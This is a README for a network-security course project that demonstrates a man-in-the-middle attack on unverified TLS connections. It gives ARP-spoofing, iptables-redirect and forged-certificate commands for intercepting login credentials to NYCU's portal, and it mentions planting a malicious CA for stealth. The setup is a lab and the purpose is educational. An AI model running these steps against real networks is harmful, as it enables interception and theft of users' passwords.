# Man-in-the-Middle Attack on Unverified TLS Connections

This is a demonstration project showing the potential damage of unverified TLS connections. The attack is accomplished by ARP spoofing and a simple man-in-the-middle HTTPS server. In this demo, all HTTPS traffic between the victim machine and 140.113/16 held by NYCU is intercepted and redirected to the man-in-the-middle server. The goal is to sniff the inputted ID and password to log into [portal.nycu.edu.tw](https://portal.nycu.edu.tw).

# Prerequisites

- At least one victim machine with Google Chrome installed
- One attack machine with Python 3.8 or later and `dsniff` installed (for `arpspoof`)
- These machines should be able to ping each other within a LAN
- It is recommended to use virtual machines

# Steps

## Attack Machine

### Enable IP forwarding to allow traffic to go through the attack machine

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

### Perform ARP spoofing on the victim machine and the gateway

If the attack is successful, the man-in-the-middle scenario holds. The interface name and the gateway IP can be found with `route -n`. The victim IP can be found through IP scanning within the LAN or just by opening a terminal on the victim machine and executing `ifconfig`. Note that at this step, all HTTPS traffic between the victim and servers within 140.113/16 is protected via TLS. To be able to get the plaintext HTTP message, the man-in-the-middle server should pretend to be the real server to the victim and establish the TLS connection with the victim.

```bash
sudo arpspoof -i <interface name> -c both -t <victim IP> -r <gateway IP>
```

### Set the NAT table

Open a new terminal for the following commands. Clear the NAT table of the `iptables` firewall and add a new rule to redirect HTTPS packets to 140.113/16 to this machine on port 8080. The man-in-the-middle server will listen on that port. At this step, the browser will show "This site can't be reached" for all HTTPS connections to 140.113/16 on the victim machine.

```bash
sudo iptables -t nat -F && \
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -m iprange \
  --dst-range 140.113.0.0-140.113.255.255 -j REDIRECT --to-port 8080
```

### Generate self-signed certificate

Generate a forged self-signed certificate for \*.nycu.edu.tw. It is used to establish the TLS connection between the victim and the man-in-the-middle server. Since the victim is assumed not to verify the legality of the certificate, using the generated certificate is fine. If the attacker has access to the victim machine, a malicious CA certificate can be installed so that all certificates signed by that CA certificate can pass the TLS verification, which allows the attack to be more covert.

```bash
openssl req -new -newkey rsa:4096 -days 30 -nodes -x509 \
  -subj "/C=TW/ST=Taiwan/L=Middle/O=Man/CN=*.nycu.edu.tw" -keyout host.key -out host.crt
```

### Run the man-in-the-middle server

The generated certificate files are assumed to be in the same location as the attack script.

```bash
sudo ./attack.py [ <interface name> ]
```

## Victim Machine

### Browse the web

Open several web pages. If the man-in-the-middle server is up, the plaintext ID and password will be shown on the attack machine every time the login request is sent.

```bash
google-chrome -incognito --ignore-certificate-errors --user-data-dir=/tmp/chrome_dev \
  "portal.nycu.edu.tw" "cs.nycu.edu.tw" "ccs.nycu.edu.tw" "eecsigp.nycu.edu.tw" \
  "dpeecs.nycu.edu.tw" "it.nycu.edu.tw" "aa.nycu.edu.tw" "timetable.nycu.edu.tw" \
  "nems.cs.nycu.edu.tw" "ocw.nycu.edu.tw"
```

# Disclaimer

The content provided in this repository is for educational purposes only. Launching such an attack on another person without consent is against the law. The script `attack.py` is part of a course project in Network Security at NYCU CS. Do not plagiarize the script if you are a student doing similar coursework.
